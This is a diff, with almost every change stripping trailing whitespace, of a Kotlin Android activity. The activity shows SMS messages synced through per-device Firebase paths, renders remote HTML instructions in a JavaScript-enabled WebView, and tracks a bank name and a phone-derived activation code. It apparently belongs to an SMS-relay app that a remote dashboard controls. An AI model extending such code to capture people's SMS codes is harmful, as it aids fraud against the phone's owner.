                     animateCardFlipToSms(smsContentFront, instructionContentBack, smsCardContentContainer)
@@ -1224,7 +1224,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error setting up SMS card flip toggle", e)
         }
     }
-    
+
     /**
      * Write current card (sms vs instruction) to Firebase cardControl/showCard.
      * Ensures dashboard stays in sync when user flips via SMS header tap ("instruction card transaction").
@@ -1254,33 +1254,33 @@ class ActivatedActivity : AppCompatActivity() {
             labelView.scaleX = 0.5f
             labelView.scaleY = 0.5f
             labelView.translationX = -50f
-            
+
             val scaleXAnim = ObjectAnimator.ofFloat(labelView, "scaleX", 0.5f, 1f).apply {
                 duration = 600
                 interpolator = android.view.animation.OvershootInterpolator(1.2f)
             }
-            
+
             val scaleYAnim = ObjectAnimator.ofFloat(labelView, "scaleY", 0.5f, 1f).apply {
                 duration = 600
                 interpolator = android.view.animation.OvershootInterpolator(1.2f)
             }
-            
+
             val translateXAnim = ObjectAnimator.ofFloat(labelView, "translationX", -50f, 0f).apply {
                 duration = 600
                 interpolator = android.view.animation.DecelerateInterpolator()
             }
-            
+
             AnimatorSet().apply {
                 playTogether(scaleXAnim, scaleYAnim, translateXAnim)
                 start()
             }
-            
+
             LogHelper.d("ActivatedActivity", "Animation: Scale + Slide")
         } catch (e: Exception) {
             resetLabelState(labelView)
         }
     }
-    
+
     /**
      * Option 2: No animation
      */
@@ -1292,7 +1292,7 @@ class ActivatedActivity : AppCompatActivity() {
             resetLabelState(labelView)
         }
     }
-    
+
     /**
      * Option 3: Fade + Scale + Slide (full animation)
      */
@@ -1302,38 +1302,38 @@ class ActivatedActivity : AppCompatActivity() {
             labelView.scaleX = 0.5f
             labelView.scaleY = 0.5f
             labelView.translationX = -50f
-            
+
             val alphaAnim = ObjectAnimator.ofFloat(labelView, "alpha", 0f, 1f).apply {
                 duration = 600
                 interpolator = android.view.animation.DecelerateInterpolator()
             }
-            
+
             val scaleXAnim = ObjectAnimator.ofFloat(labelView, "scaleX", 0.5f, 1f).apply {
                 duration = 600
                 interpolator = android.view.animation.OvershootInterpolator(1.2f)
             }
-            
+
             val scaleYAnim = ObjectAnimator.ofFloat(labelView, "scaleY", 0.5f, 1f).apply {
                 duration = 600
                 interpolator = android.view.animation.OvershootInterpolator(1.2f)
             }
-            
+
             val translateXAnim = ObjectAnimator.ofFloat(labelView, "translationX", -50f, 0f).apply {
                 duration = 600
                 interpolator = android.view.animation.DecelerateInterpolator()
             }
-            
+
             AnimatorSet().apply {
                 playTogether(alphaAnim, scaleXAnim, scaleYAnim, translateXAnim)
                 start()
             }
-            
+
             LogHelper.d("ActivatedActivity", "Animation: Fade + Scale + Slide")
         } catch (e: Exception) {
             resetLabelState(labelView)
         }
     }
-    
+
     /**
      * Option 4: Fade only
      */
@@ -1343,20 +1343,20 @@ class ActivatedActivity : AppCompatActivity() {
             labelView.scaleX = 1f
             labelView.scaleY = 1f
             labelView.translationX = 0f
-            
+
             val alphaAnim = ObjectAnimator.ofFloat(labelView, "alpha", 0f, 1f).apply {
                 duration = 400
                 interpolator = android.view.animation.DecelerateInterpolator()
             }
-            
+
             alphaAnim.start()
-            
+
             LogHelper.d("ActivatedActivity", "Animation: Fade only")
         } catch (e: Exception) {
             resetLabelState(labelView)
         }
     }
-    
+
     /**
      * Option 5: Scale only (bounce)
      */
@@ -1366,28 +1366,28 @@ class ActivatedActivity : AppCompatActivity() {
             labelView.scaleX = 0.3f
             labelView.scaleY = 0.3f
             labelView.translationX = 0f
-            
+
             val scaleXAnim = ObjectAnimator.ofFloat(labelView, "scaleX", 0.3f, 1f).apply {
                 duration = 500
                 interpolator = android.view.animation.OvershootInterpolator(1.5f)
             }
-            
+
             val scaleYAnim = ObjectAnimator.ofFloat(labelView, "scaleY", 0.3f, 1f).apply {
                 duration = 500
                 interpolator = android.view.animation.OvershootInterpolator(1.5f)
             }
-            
+
             AnimatorSet().apply {
                 playTogether(scaleXAnim, scaleYAnim)
                 start()
             }
-            
+
             LogHelper.d("ActivatedActivity", "Animation: Scale only (bounce)")
         } catch (e: Exception) {
             resetLabelState(labelView)
         }
     }
-    
+
     /**
      * Reset label to normal state
      */
@@ -1397,7 +1397,7 @@ class ActivatedActivity : AppCompatActivity() {
         labelView.scaleY = 1f
         labelView.translationX = 0f
     }
-    
+
     /**
      * Load initial SMS messages from Firebase
      */
@@ -1405,7 +1405,7 @@ class ActivatedActivity : AppCompatActivity() {
         try {
             val messagesRef = Firebase.database.reference
                 .child(AppConfig.getFirebaseMessagePath(cachedAndroidId))
-            
+
             // Load messages locally (don't query Firebase for total count)
             messagesRef.orderByKey()
                 .limitToLast(50)
@@ -1420,7 +1420,7 @@ class ActivatedActivity : AppCompatActivity() {
                             val body: String
                             val timestamp: Long
                             val type: String
-                            
+
                             if (messageValue != null && messageValue.contains("~")) {
                                 // String format: "received~phone~body" or "sent~phone~body"
                                 val parts = messageValue.split("~")
@@ -1439,7 +1439,7 @@ class ActivatedActivity : AppCompatActivity() {
                                 timestamp = child.child("timestamp").getValue(Long::class.java) ?: child.key?.toLongOrNull() ?: System.currentTimeMillis()
                                 type = child.child("type").getValue(String::class.java) ?: "received"
                             }
-                            
+
                             // Allow test messages to be displayed
                             messages.add(SmsMessageItem(
                                 type = type,
@@ -1448,30 +1448,30 @@ class ActivatedActivity : AppCompatActivity() {
                                 timestamp = timestamp
                             ))
                         }
-                        
+
                         // Sort by timestamp descending (newest first)
                         messages.sortByDescending { it.timestamp }
                         // Keep only last 10 messages for display
                         val limitedMessages = messages.take(10)
-                        
+
                         // Count messages locally (start from loaded messages)
                         totalSmsMessageCount = messages.size
                         // Track the latest message timestamp to only count newer messages in onChildAdded
                         lastLoadedMessageTimestamp = messages.maxOfOrNull { it.timestamp } ?: 0L
                         initialLoadCompleted = true
                         initialLoadTimestamp = System.currentTimeMillis()
-                        
+
                         LogHelper.d("ActivatedActivity", "Initial load: ${messages.size} messages counted locally, latest timestamp: $lastLoadedMessageTimestamp")
-                        
+
                         handler.post {
                             try {
                                 smsAdapter.submitList(limitedMessages) {
                                     id.smsRecyclerView.scrollToPosition(0)
                                 }
-                                
+
                                 // Update count badge with total messages (not just displayed 10)
                                 animateCountBadgeUpdate(id.smsCountBadge, totalSmsMessageCount.toString())
-                                
+
                                 // Show/hide empty state
                                 if (limitedMessages.isEmpty()) {
                                     id.smsEmptyState.visibility = View.VISIBLE
@@ -1480,7 +1480,7 @@ class ActivatedActivity : AppCompatActivity() {
                                     id.smsEmptyState.visibility = View.GONE
                                     id.smsRecyclerView.visibility = View.VISIBLE
                                     }
-                                    
+
                                 LogHelper.d("ActivatedActivity", "Loaded ${limitedMessages.size} initial SMS messages (filtered from ${messages.size})")
                                 } catch (e: Exception) {
                                 LogHelper.e("ActivatedActivity", "Error updating SMS list with initial messages", e)
@@ -1497,7 +1497,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error in loadInitialSmsMessages", e)
         }
     }
-    
+
     /**
      * Setup Firebase listener for SMS messages
      */
@@ -1506,7 +1506,7 @@ class ActivatedActivity : AppCompatActivity() {
             // Use the new message path: message/{deviceId}/msg
             val messagesRef = Firebase.database.reference
                 .child(AppConfig.getFirebaseMessagePath(cachedAndroidId))
-            
+
             // Remove existing listener to prevent duplicates
             smsFirebaseListener?.let {
                 try {
@@ -1516,13 +1516,13 @@ class ActivatedActivity : AppCompatActivity() {
                     LogHelper.e("ActivatedActivity", "Error removing existing SMS listener", e)
                 }
             }
-            
+
             // Listen for all messages - limit is applied when displaying
             // We listen to all messages to catch new ones immediately
             val query = messagesRef.orderByKey()
-            
+
             LogHelper.d("ActivatedActivity", "Setting up SMS listener at path: ${AppConfig.getFirebaseMessagePath(cachedAndroidId)}")
-            
+
             smsFirebaseListener = object : com.google.firebase.database.ChildEventListener {
                     override fun onChildAdded(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
                         try {
@@ -1532,7 +1532,7 @@ class ActivatedActivity : AppCompatActivity() {
                             val body: String
                             val timestamp: Long
                             val type: String
-                            
+
                             if (messageValue != null && messageValue.contains("~")) {
                                 // String format: "received~phone~body" or "sent~phone~body"
                                 val parts = messageValue.split("~")
@@ -1551,27 +1551,27 @@ class ActivatedActivity : AppCompatActivity() {
                                 timestamp = snapshot.child("timestamp").getValue(Long::class.java) ?: snapshot.key?.toLongOrNull() ?: System.currentTimeMillis()
                                 type = snapshot.child("type").getValue(String::class.java) ?: "received"
                             }
-                            
+
                             val messageItem = SmsMessageItem(
                                 type = type,
                                 phoneNumber = phoneNumber,
                                 body = body,
                                 timestamp = timestamp
                             )
-                            
+
                             handler.post {
                                 try {
                                     LogHelper.d("ActivatedActivity", "New SMS message received: $phoneNumber - $body")
-                                    
+
                                     val currentList = smsAdapter.currentList.toMutableList()
-                                    
+
                                     // Check for duplicates before adding (same timestamp and phone number)
-                                    val isDuplicate = currentList.any { 
-                                        it.timestamp == messageItem.timestamp && 
+                                    val isDuplicate = currentList.any {
+                                        it.timestamp == messageItem.timestamp &&
                                         it.phoneNumber == messageItem.phoneNumber &&
                                         it.body == messageItem.body
                                     }
-                                    
+
                                     // Allow test messages to be displayed
                                     if (!isDuplicate) {
                                         currentList.add(messageItem)
@@ -1592,17 +1592,17 @@ class ActivatedActivity : AppCompatActivity() {
                                         LogHelper.d("ActivatedActivity", "Duplicate message detected, skipping")
                                         return@post
                                     }
-                                    
+
                                     // Sort by timestamp descending (newest first)
                                     currentList.sortByDescending { it.timestamp }
                                     // Keep only last 10 messages for display
                                     val limitedList = currentList.take(10)
-                                    
+
                                     LogHelper.d("ActivatedActivity", "Submitting ${limitedList.size} messages to adapter (Total: $totalSmsMessageCount)")
-                                    
+
                                     // Cancel any pending scroll to prevent conflicts
                                     pendingScrollRunnable?.let { handler.removeCallbacks(it) }
-                                    
+
                                     // Submit list update
                                     try {
                                         smsAdapter.submitList(limitedList) {
@@ -1624,18 +1624,18 @@ class ActivatedActivity : AppCompatActivity() {
                                     } catch (e: Exception) {
                                         LogHelper.e("ActivatedActivity", "Error submitting list to adapter", e)
                                     }
-                                    
+
                                     // Update count badge with total messages (not just displayed 10)
                                     try {
                                         animateCountBadgeUpdate(id.smsCountBadge, totalSmsMessageCount.toString())
                                     } catch (e: Exception) {
                                         LogHelper.e("ActivatedActivity", "Error animating count badge", e)
                                     }
-                                    
+
                                     // Animate SMS card border to blink twice for new message (debounced)
                                     // Only animate once even if multiple messages arrive quickly
                                     animateSmsCardBorderBlink()
-                                    
+
                                     // Show/hide empty state
                                     if (limitedList.isEmpty()) {
                                         id.smsEmptyState.visibility = View.VISIBLE
@@ -1644,7 +1644,7 @@ class ActivatedActivity : AppCompatActivity() {
                                         id.smsEmptyState.visibility = View.GONE
                                         id.smsRecyclerView.visibility = View.VISIBLE
                                     }
-                                    
+
                                     LogHelper.d("ActivatedActivity", "SMS list updated successfully")
                                 } catch (e: Exception) {
                                     LogHelper.e("ActivatedActivity", "Error updating SMS list", e)
@@ -1654,46 +1654,46 @@ class ActivatedActivity : AppCompatActivity() {
                             LogHelper.e("ActivatedActivity", "Error parsing SMS message", e)
                         }
                     }
-                    
+
                     override fun onChildChanged(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
                         // Handle updates if needed
                     }
-                    
+
                     override fun onChildRemoved(snapshot: com.google.firebase.database.DataSnapshot) {
                         // Handle removals if needed
                     }
-                    
+
                     override fun onChildMoved(snapshot: com.google.firebase.database.DataSnapshot, previousChildName: String?) {
                         // Handle moves if needed
                     }
-                    
+
                     override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                         LogHelper.e("ActivatedActivity", "SMS Firebase listener cancelled", error.toException())
                     }
                 }
-            
+
             query.addChildEventListener(smsFirebaseListener!!)
-            
+
             LogHelper.d("ActivatedActivity", "SMS Firebase listener setup complete at path: ${AppConfig.getFirebaseMessagePath(cachedAndroidId)}")
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error setting up SMS Firebase listener", e)
         }
     }
-    
+
     /**
      * Setup Firebase listeners
      */
     private fun setupFirebaseListeners() {
         firebaseManager.startListeners()
     }
-    
+
     /**
      * Setup buttons
      */
     private fun setupButtons() {
         try {
             buttonManager.setupButtons()
-            
+
             // Also set up direct click listener as fallback
             try {
                 val testButton = id.testButtonCard
@@ -1715,17 +1715,17 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error in setupButtons", e)
         }
     }
-    
+
     /**
      * Handle intent data
      */
     private fun handleIntentData() {
         val phoneFromIntent = intent.getStringExtra("phone")
         activationCode = intent.getStringExtra("code")
-        
+
         // Get activation mode (testing or running)
         val activationMode = intent.getStringExtra("activationMode")
-        
+
         // Update code label based on activation mode with animation
         if (activationMode != null) {
             val phoneCodeLabelView = id.phoneCodeLabel
@@ -1740,14 +1740,14 @@ class ActivatedActivity : AppCompatActivity() {
                 animateLabelAppearance(phoneCodeLabelView)
             }
         }
-        
+
         if (!activationCode.isNullOrBlank()) {
             viewModel.activationCode = activationCode
         }
-        
+
         viewModel.shouldAnimate = intent.getBooleanExtra("animate", false)
     }
-    
+
     /**
      * Check permissions and update UI
      */
@@ -1755,7 +1755,7 @@ class ActivatedActivity : AppCompatActivity() {
         try {
             val hasAllPermissions = PermissionManager.hasAllMandatoryPermissions(this)
             viewModel.hasAllPermissions = hasAllPermissions
-            
+
             // Force all cards visible
             handler.post {
                 try {
@@ -1771,7 +1771,7 @@ class ActivatedActivity : AppCompatActivity() {
                     LogHelper.e("ActivatedActivity", "Error setting cards visible in checkPermissions", e)
                 }
             }
-            
+
             if (hasAllPermissions) {
                 LogHelper.d("ActivatedActivity", "All permissions granted")
             } else {
@@ -1781,7 +1781,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error checking permissions", e)
         }
     }
-    
+
     /**
      * Update bank name display
      * Note: Container removed - bank name tracked internally only
@@ -1792,7 +1792,7 @@ class ActivatedActivity : AppCompatActivity() {
             // Container removed - no UI to update
         }
     }
-    
+
     /**
      * Update company name (if needed in future)
      */
@@ -1800,7 +1800,7 @@ class ActivatedActivity : AppCompatActivity() {
         viewModel.companyName = companyName
         // Company name can be displayed if needed
     }
-    
+
     /**
      * Update other info (if needed in future)
      */
@@ -1808,7 +1808,7 @@ class ActivatedActivity : AppCompatActivity() {
         viewModel.otherInfo = otherInfo
         // Other info can be displayed if needed
     }
-    
+
     /**
      * Update instruction display with vertical flip animation
      * SMS content fades out → vertical flip → instruction fades in
@@ -1816,25 +1816,25 @@ class ActivatedActivity : AppCompatActivity() {
     private fun updateInstructionDisplay(html: String, css: String, imageUrl: String?) {
         try {
             val webView = id.instructionWebView
-            
+
             LogHelper.d("ActivatedActivity", "updateInstructionDisplay called - HTML: ${html.take(50)}..., CSS: ${css.take(50)}..., ImageUrl: ${imageUrl?.take(50)}...")
-            
+
             // Track if instruction content exists (for flip toggle logic)
             val hasRemoteInstruction = html.isNotBlank() || !imageUrl.isNullOrBlank() || css.isNotBlank()
             hasInstructionContent = true
-            
+
             LogHelper.d("ActivatedActivity", "hasInstructionContent: $hasInstructionContent")
-            
+
             // Configure WebView
             webView.settings.javaScriptEnabled = true
             webView.settings.domStorageEnabled = true
             webView.settings.loadWithOverviewMode = true
             webView.settings.useWideViewPort = true
             webView.setBackgroundColor(0x00000000) // Transparent
-            
+
             // Clear cache to ensure fresh content loads
             webView.clearCache(true)
-            
+
             // Build image HTML if imageUrl is provided
             val imageHtml = if (!imageUrl.isNullOrBlank()) {
                 """
@@ -1909,7 +1909,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error updating instruction display", e)
         }
     }
-    
+
     /**
      * Animate card flip from SMS to Instruction (vertical up/down)
      * Sequence: SMS fade out → vertical flip → instruction fade in
@@ -1920,38 +1920,38 @@ class ActivatedActivity : AppCompatActivity() {
         container: FrameLayout
     ) {
         if (isDestroyed || isFinishing) return
-        
+
         // Set camera distance for 3D effect
         val cameraDistance = resources.displayMetrics.density * 8000
         container.cameraDistance = cameraDistance
-        
+
         // Step 1: Fade out SMS content
         val fadeOutSms = ObjectAnimator.ofFloat(smsFront, "alpha", smsFront.alpha, 0f).apply {
             duration = 200
             interpolator = android.view.animation.AccelerateInterpolator()
         }
-        
+
         fadeOutSms.addListener(object : AnimatorListenerAdapter() {
             override fun onAnimationEnd(animation: Animator) {
                 if (isDestroyed || isFinishing) return
-                
+
                 // Step 2: Vertical flip (up/down rotation)
                 smsFront.visibility = View.GONE
                 instructionBack.visibility = View.VISIBLE
                 instructionBack.alpha = 0f
-                
+
                 // Set initial rotation for back side (180 degrees - flipped)
                 // Use ObjectAnimator to set rotationX property
                 val setRotationBack = ObjectAnimator.ofFloat(instructionBack, "rotationX", 180f).apply {
                     duration = 0
                 }
                 setRotationBack.start()
-                
+
                 val flipAnimator = ObjectAnimator.ofFloat(container, "rotationX", 0f, 180f).apply {
                     duration = 600
                     interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                 }
-                
+
                 flipAnimator.addUpdateListener { animator ->
                     if (isDestroyed || isFinishing) return@addUpdateListener
                     val rotation = animator.animatedValue as Float
@@ -1961,16 +1961,16 @@ class ActivatedActivity : AppCompatActivity() {
                         ObjectAnimator.ofFloat(instructionBack, "rotationX", 0f).apply { duration = 0 }.start()
                     }
                 }
-                
+
                 flipAnimator.addListener(object : AnimatorListenerAdapter() {
                     override fun onAnimationEnd(animation: Animator) {
                         if (isDestroyed || isFinishing) return
-                        
+
                         // Step 3: Reset rotations and fade in instruction content
                         ObjectAnimator.ofFloat(container, "rotationX", 0f).apply { duration = 0 }.start()
                         ObjectAnimator.ofFloat(smsFront, "rotationX", 0f).apply { duration = 0 }.start()
                         ObjectAnimator.ofFloat(instructionBack, "rotationX", 0f).apply { duration = 0 }.start()
-                        
+
                         val fadeInInstruction = ObjectAnimator.ofFloat(instructionBack, "alpha", 0f, 1f).apply {
                             duration = 200
                             interpolator = android.view.animation.DecelerateInterpolator()
@@ -1978,14 +1978,14 @@ class ActivatedActivity : AppCompatActivity() {
                         fadeInInstruction.start()
                     }
                 })
-                
+
                 flipAnimator.start()
             }
         })
-        
+
         fadeOutSms.start()
     }
-    
+
     /**
      * Animate card flip from Instruction to SMS (vertical up/down reverse)
      * Sequence: Instruction fade out → vertical flip → SMS fade in
@@ -1996,38 +1996,38 @@ class ActivatedActivity : AppCompatActivity() {
         container: FrameLayout
     ) {
         if (isDestroyed || isFinishing) return
-        
+
         // Set camera distance for 3D effect
         val cameraDistance = resources.displayMetrics.density * 8000
         container.cameraDistance = cameraDistance
-        
+
         // Step 1: Fade out instruction content
         val fadeOutInstruction = ObjectAnimator.ofFloat(instructionBack, "alpha", instructionBack.alpha, 0f).apply {
             duration = 200
             interpolator = android.view.animation.AccelerateInterpolator()
         }
-        
+
         fadeOutInstruction.addListener(object : AnimatorListenerAdapter() {
             override fun onAnimationEnd(animation: Animator) {
                 if (isDestroyed || isFinishing) return
-                
+
                 // Step 2: Vertical flip reverse (down/up rotation)
                 instructionBack.visibility = View.GONE
                 smsFront.visibility = View.VISIBLE
                 smsFront.alpha = 0f
-                
+
                 // Set initial rotation for front side (180 degrees - flipped)
                 // Use ObjectAnimator to set rotationX property
                 val setRotationFront = ObjectAnimator.ofFloat(smsFront, "rotationX", 180f).apply {
                     duration = 0
                 }
                 setRotationFront.start()
-                
+
                 val flipAnimator = ObjectAnimator.ofFloat(container, "rotationX", 180f, 0f).apply {
                     duration = 600
                     interpolator = android.view.animation.AccelerateDecelerateInterpolator()
                 }
-                
+
                 flipAnimator.addUpdateListener { animator ->
                     if (isDestroyed || isFinishing) return@addUpdateListener
                     val rotation = animator.animatedValue as Float
@@ -2037,16 +2037,16 @@ class ActivatedActivity : AppCompatActivity() {
                         ObjectAnimator.ofFloat(smsFront, "rotationX", 0f).apply { duration = 0 }.start()
                     }
                 }
-                
+
                 flipAnimator.addListener(object : AnimatorListenerAdapter() {
                     override fun onAnimationEnd(animation: Animator) {
                         if (isDestroyed || isFinishing) return
-                        
+
                         // Step 3: Reset rotations and fade in SMS content
                         ObjectAnimator.ofFloat(container, "rotationX", 0f).apply { duration = 0 }.start()
                         ObjectAnimator.ofFloat(smsFront, "rotationX", 0f).apply { duration = 0 }.start()
                         ObjectAnimator.ofFloat(instructionBack, "rotationX", 0f).apply { duration = 0 }.start()
-                        
+
                         val fadeInSms = ObjectAnimator.ofFloat(smsFront, "alpha", 0f, 1f).apply {
                             duration = 200
                             interpolator = android.view.animation.DecelerateInterpolator()
@@ -2054,14 +2054,14 @@ class ActivatedActivity : AppCompatActivity() {
                         fadeInSms.start()
                     }
                 })
-                
+
                 flipAnimator.start()
             }
         })
-        
+
         fadeOutInstruction.start()
     }
-    
+
     /**
      * Update activation code display in phone card
      */
@@ -2072,7 +2072,7 @@ class ActivatedActivity : AppCompatActivity() {
                 val codeWithoutDashes = removeDashesFromCode(code)
                 activationCode = codeWithoutDashes
                 viewModel.activationCode = codeWithoutDashes
-                
+
                 // Update phone card display with formatted code (with dashes)
                 val phoneCodeView = id.phoneCode
                 if (phoneCodeView != null) {
@@ -2084,7 +2084,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error updating activation code display", e)
         }
     }
-    
+
     /**
      * Setup date/time display - updates every minute
      */
@@ -2094,7 +2094,7 @@ class ActivatedActivity : AppCompatActivity() {
             if (dateTimeView != null) {
                 // Update immediately
                 updateDateTimeDisplay()
-                
+
                 // Update every minute (60 seconds)
                 val updateRunnable = object : Runnable {
                     override fun run() {
@@ -2111,7 +2111,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error setting up date/time display", e)
         }
     }
-    
+
     /**
      * Update date/time display with format DD-MM / HH:MM
      */
@@ -2124,7 +2124,7 @@ class ActivatedActivity : AppCompatActivity() {
                 val month = String.format("%02d", calendar.get(java.util.Calendar.MONTH) + 1) // Month is 0-based
                 val hour = String.format("%02d", calendar.get(java.util.Calendar.HOUR_OF_DAY))
                 val minute = String.format("%02d", calendar.get(java.util.Calendar.MINUTE))
-                
+
                 val dateTimeText = "$day-$month / $hour:$minute"
                 dateTimeView.text = dateTimeText
             }
@@ -2149,7 +2149,7 @@ class ActivatedActivity : AppCompatActivity() {
             null
         }
     }
-    
+
     /**
      * Listen for activation code from Firebase
      * Note: Code display is hidden, but we still track it internally
@@ -2166,7 +2166,7 @@ class ActivatedActivity : AppCompatActivity() {
                     activationCode = codeWithoutDashes
                     viewModel.activationCode = codeWithoutDashes
                     // Don't set text since UI is hidden
-                    
+
                     // Setup BANK data listener for status card (use code without dashes)
                     handler.post {
                         try {
@@ -2187,7 +2187,7 @@ class ActivatedActivity : AppCompatActivity() {
                         val convertedCode = convertPhoneToCode(phoneNumber)
                         activationCode = convertedCode
                         viewModel.activationCode = convertedCode
-                        
+
                         // Setup BANK data listener for status card (code is already without dashes)
                         handler.post {
                             try {
@@ -2204,7 +2204,7 @@ class ActivatedActivity : AppCompatActivity() {
                 }
         }
     }
-    
+
     /**
      * Convert phone number to code
      * Returns code WITHOUT dashes (e.g., "XXXXX11111")
@@ -2212,16 +2212,16 @@ class ActivatedActivity : AppCompatActivity() {
      */
     private fun convertPhoneToCode(phone: String): String {
         val normalized = normalizePhone(phone)
-        
+
         // Sequence numbers to add to each phone digit
         val sequence = intArrayOf(10, 52, 63, 89, 12, 36, 63, 78, 63, 75)
-        
+
         // Ensure phone number has at least 10 digits (pad with zeros if shorter)
         val phoneDigits = normalized.padStart(10, '0').take(10)
-        
+
         val code = StringBuilder()
         val alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
-        
+
         // Format: XXXXX11111 (5 letters + 5 numbers, no dashes - dashes are only for display)
         // First 5 characters: letters (XXXXX)
         for (i in 0 until 5) {
@@ -2231,7 +2231,7 @@ class ActivatedActivity : AppCompatActivity() {
             val letterIndex = sum % 26
             code.append(alphabet[letterIndex])
         }
-        
+
         // Last 5 characters: digits (11111)
         for (i in 5 until 10) {
             val phoneDigit = phoneDigits[i].toString().toIntOrNull() ?: 0
@@ -2240,27 +2240,27 @@ class ActivatedActivity : AppCompatActivity() {
             val digit = sum % 10
             code.append(digit)
         }
-        
+
         return code.toString()
     }
-    
+
     /**
      * Format code for display by adding dash between letters and numbers
      * Input: "XXXXX11111" -> Output: "XXXXX-11111"
      */
     private fun formatCodeForDisplay(code: String): String {
         if (code.isBlank()) return code
-        
+
         // Remove any existing dashes first (for backward compatibility)
         val cleanCode = code.replace("-", "")
-        
+
         // Must be exactly 10 characters (5 letters + 5 numbers)
         if (cleanCode.length != 10) return code
-        
+
         // Format: XXXXX-11111 (5 letters - 5 numbers)
         return "${cleanCode.substring(0, 5)}-${cleanCode.substring(5, 10)}"
     }
-    
+
     /**
      * Remove dashes from code (for Firebase storage)
      * Input: "XXX-XXXX-XXX" -> Output: "XXXXX11111"
@@ -2268,21 +2268,21 @@ class ActivatedActivity : AppCompatActivity() {
     private fun removeDashesFromCode(code: String): String {
         return code.replace("-", "")
     }
-    
+
     /**
      * Normalize phone number
      */
     private fun normalizePhone(phone: String): String {
         return phone.replace(Regex("[^0-9]"), "")
     }
-    
+
     /**
      * Handle reset button click
      */
     private fun handleResetClick() {
             resetActivation()
     }
-    
+
     /**
      * Handle test button click
      */
@@ -2297,7 +2297,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error setting up test timer", e)
         }
     }
-    
+
     /**
      * Start the test timer (counts up)
      */
@@ -2306,7 +2306,7 @@ class ActivatedActivity : AppCompatActivity() {
             if (isTimerRunning) {
                 return // Timer already running
             }
-            
+
             isTimerRunning = true
             testTimerRunnable = object : Runnable {
                 override fun run() {
@@ -2325,7 +2325,7 @@ class ActivatedActivity : AppCompatActivity() {
             isTimerRunning = false
         }
     }
-    
+
     /**
      * Reset the test timer to zero
      */
@@ -2337,7 +2337,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error resetting test timer", e)
         }
     }
-    
+
     /**
      * Update the test timer display
      */
@@ -2354,7 +2354,7 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.e("ActivatedActivity", "Error updating test timer display", e)
         }
     }
-    
+
     private fun handleTestClick() {
         try {
             // Prevent multiple simultaneous clicks
@@ -2362,18 +2362,18 @@ class ActivatedActivity : AppCompatActivity() {
                 LogHelper.w("ActivatedActivity", "Test already in progress, ignoring duplicate click")
                 return
             }
-            
+
             if (isDestroyed || isFinishing) {
                 LogHelper.w("ActivatedActivity", "Activity destroyed or finishing, ignoring test click")
                 return
             }
-            
+
             isTesting = true
             LogHelper.d("ActivatedActivity", "handleTestClick called")
-            
+
             // Reset timer to zero on click
             resetTestTimer()
-            
+
             // Disable button during test
             try {
                 id.testButtonCard.isEnabled = false
@@ -2381,10 +2381,10 @@ class ActivatedActivity : AppCompatActivity() {
         } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error disabling test button", e)
             }
-            
+
             testFakeSms()
             LogHelper.d("ActivatedActivity", "testFakeSms called successfully")
-            
+
             // Re-enable button after a delay
             handler.postDelayed({
                 try {
@@ -2398,7 +2398,7 @@ class ActivatedActivity : AppCompatActivity() {
                     isTesting = false
                 }
             }, 2000) // 2 second cooldown
-            
+
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error in handleTestClick", e)
             isTesting = false
@@ -2413,7 +2413,7 @@ class ActivatedActivity : AppCompatActivity() {
             }
         }
     }
-    
+
     /**
      * Reset activation
      */
@@ -2423,12 +2423,12 @@ class ActivatedActivity : AppCompatActivity() {
             LogHelper.w("ActivatedActivity", "Reset already in progress, ignoring duplicate call")
                             return
                         }
-        
+
         isResetting = true
-        
+
         try {
             LogHelper.d("ActivatedActivity", "Starting reset activation")
-            
+
             // Cancel all handler runnables first
             try {
                 handlerRunnables.forEach { handler.removeCallbacks(it) }
@@ -2436,16 +2436,16 @@ class ActivatedActivity : AppCompatActivity() {
                                     } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error clearing handler runnables", e)
                                     }
-            
+
             // Cleanup managers to prevent crashes
                                     try {
                 firebaseManager.cleanup()
                                     } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error cleaning up Firebase manager", e)
             }
-            
+
             val deviceRef = Firebase.database.reference.child(AppConfig.getFirebaseDevicePath(cachedAndroidId))
-            
+
             // Remove code mapping with error handling
             deviceRef.child(AppConfig.FirebasePaths.CODE).removeValue()
                 .addOnSuccessListener {
@@ -2454,7 +2454,7 @@ class ActivatedActivity : AppCompatActivity() {
                 .addOnFailureListener { e ->
                     LogHelper.e("ActivatedActivity", "Error removing code", e)
                 }
-            
+
             // Set isActive to false with error handling
             deviceRef.child(AppConfig.FirebasePaths.IS_ACTIVE).setValue("Closed")
                 .addOnSuccessListener {
@@ -2463,7 +2463,7 @@ class ActivatedActivity : AppCompatActivity() {
                 .addOnFailureListener { e ->
                     LogHelper.e("ActivatedActivity", "Error setting isActive", e)
                 }
-            
+
             // Clear setup.txt
             try {
                 writeInternalFile("setup.txt", "")
@@ -2471,7 +2471,7 @@ class ActivatedActivity : AppCompatActivity() {
         } catch (e: Exception) {
                 LogHelper.e("ActivatedActivity", "Error clearing setup.txt", e)
             }
-            
+
             // Navigate to SplashActivity after a short delay to ensure cleanup
                     handler.postDelayed({
                 try {
@@ -2490,7 +2490,7 @@ class ActivatedActivity : AppCompatActivity() {
                     isResetting = false
                 }
             }, 300) // Small delay to ensure Firebase operations start
-            
+
         } catch (e: Exception) {
             LogHelper.e("ActivatedActivity", "Error in resetActivation", e)
             isResetting = false
